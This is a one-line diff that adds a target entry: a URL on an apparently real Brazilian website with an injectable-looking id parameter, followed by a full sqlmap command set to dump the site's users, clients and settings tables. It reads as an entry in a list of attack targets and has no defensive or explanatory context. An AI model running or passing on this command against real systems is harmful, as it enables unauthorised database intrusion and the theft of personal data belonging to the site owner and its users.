@@ -1,0 +1,1 @@
+http://www.jarbasmachadoareasrurais.com.br/?site=conteudos&id=2 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.jarbasmachadoareasrurais.com.br/?site=conteudos&id=2 -D jarbasmachadoa -T usuarios,clientes,configuracoes --dump
